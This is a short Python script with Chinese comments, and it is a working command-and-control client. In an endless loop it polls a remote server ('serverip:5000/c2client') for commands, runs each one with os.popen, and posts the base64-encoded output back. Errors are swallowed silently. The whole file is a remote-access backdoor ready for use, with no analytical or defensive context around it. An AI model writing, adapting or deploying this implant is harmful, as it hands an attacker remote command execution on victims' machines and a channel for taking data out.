#! /usr/bin/env python
# coding=utf-8
import requests
import time
import os
import re
import threading
import base64

#把serverip 替换成对应服务器ip

def receive(id):
	url="http://serverip:5000/c2client?cmd="+str(id)
	#print url
	# 接收待执行命令
	try:
		while True:
			
			s1= requests.get(url, timeout=10)
			#print s1.status_code
			if s1.status_code == 200:
				command= s1.content
				#print command
				return command
			time.sleep(1)
	except:
		return None


def send(result):
	r1=result
	#print r1
	url="http://serverip:5000/c2client?results="#+base64.b64encode(str(r1))
	data = {"results": base64.b64encode(str(r1))}
	#print url
	# 命令执行结束的回显发送
	try:
		while True:
			s1= requests.post(url,data=data,timeout=30)
			#print s1.status_code
			if s1.status_code == 200:
				return
			time.sleep(1)
	except:
		return None


def cmd(command):
	#执行系统命令并获取回显
	try:
		output = os.popen(command)
		result = output.read()
		if result:
			return result
		else:
			return None
		#print result
	except:
		return None



if __name__ == '__main__':
	i=0
	while True:
		i+=1
		#print i
		time.sleep(1)
		try:
			#接收命令
			cmd1=receive(i)
			if cmd1!= None:
				#执行命令
				result1=cmd(cmd1)
				#print result1
				if result1 != None:
					#发送结果
					send(result1)
		except:
			pass
